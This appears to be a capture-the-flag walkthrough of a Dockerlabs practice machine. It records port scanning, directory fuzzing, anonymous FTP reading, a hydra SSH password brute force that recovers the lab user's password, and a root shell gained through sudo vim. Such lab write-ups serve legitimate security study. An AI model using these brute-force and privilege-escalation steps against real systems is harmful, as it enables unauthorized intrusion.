# IP
172.17.0.2
# Enumeration
## ICMP
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.056 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.040 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1013ms
rtt min/avg/max/mdev = 0.040/0.048/0.056/0.008 ms
```

Device is discoverable
## Ports scanning
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ nmap -sV -sC -p- -n 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-09 18:29 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
|_-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)
|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Russoski Coaching
MAC Address: 0E:2D:55:75:8C:4B (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.99 seconds
```

Three open ports
- 21 -> FTP
- 22 -> SSH
- 80 -> HTTP
## Dir Fuzzing
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,conf,sh,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,conf,sh,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.php             (Status: 403) [Size: 275]
.htaccess.php        (Status: 403) [Size: 275]
.htaccess.html       (Status: 403) [Size: 275]
.hta.conf            (Status: 403) [Size: 275]
.hta.html            (Status: 403) [Size: 275]
.hta.txt             (Status: 403) [Size: 275]
.hta                 (Status: 403) [Size: 275]
.hta.sh              (Status: 403) [Size: 275]
.htpasswd.sh         (Status: 403) [Size: 275]
.htpasswd.php        (Status: 403) [Size: 275]
.htaccess.conf       (Status: 403) [Size: 275]
.htpasswd            (Status: 403) [Size: 275]
.htpasswd.conf       (Status: 403) [Size: 275]
.htaccess.sh         (Status: 403) [Size: 275]
.htpasswd.html       (Status: 403) [Size: 275]
.htaccess.txt        (Status: 403) [Size: 275]
.htaccess            (Status: 403) [Size: 275]
.htpasswd.txt        (Status: 403) [Size: 275]
backup               (Status: 301) [Size: 309] [--> http://172.17.0.2/backup/]
important            (Status: 301) [Size: 312] [--> http://172.17.0.2/important/]
index.html           (Status: 200) [Size: 5208]
index.html           (Status: 200) [Size: 5208]
server-status        (Status: 403) [Size: 275]
Progress: 27678 / 27678 (100.00%)
===============================================================
Finished
===============================================================
```

Interesting findings

- Comment on index.html page
<! -- Utilizando el mismo usuario para todos mis servicios, podré recordarlo fácilmente --
All services have the same username

- backup.txt content seen in /backup
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ curl http://172.17.0.2/backup/backup.txt
Usuario para todos mis servicios: russoski (cambiar pronto!)
```
Username is russoski
-> russoski is an active SSH username
## FTP enumeration
It is posible to login anonymously

```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:codebylauti): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||49250|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
226 Directory send OK.
ftp>
```

Got two hints from FTP files
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/super-easy/obsession]
└─$ cat chat-gonza.txt
[16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
[16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
[16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
[21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
[21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
[22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy

┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/super-easy/obsession]
└─$ cat pendientes.txt
1 Comprar el Voucher de la certificación eJPTv2 cuanto antes!

2 Aumentar el precio de mis asesorías online en la Web!

3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!

4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
  permisos habilitados que no son del todo seguros..
```

## Brute force
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-09 19:14:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 19 final worker threads did not complete until end.
[ERROR] 19 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-09 19:15:08
```

Found password: iloveme

## Post enumeration
```sh
russoski@5a7431623dce:~$ sudo -l
Matching Defaults entries for russoski on 5a7431623dce:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User russoski may run the following commands on 5a7431623dce:
    (root) NOPASSWD: /usr/bin/vim
```

russoski user can execute vim as root
It's possible we can escalate priviledges using this

```sh
russoski@5a7431623dce:~$ sudo vim -c ':!/bin/sh' /dev/null

# whoami
root
``|`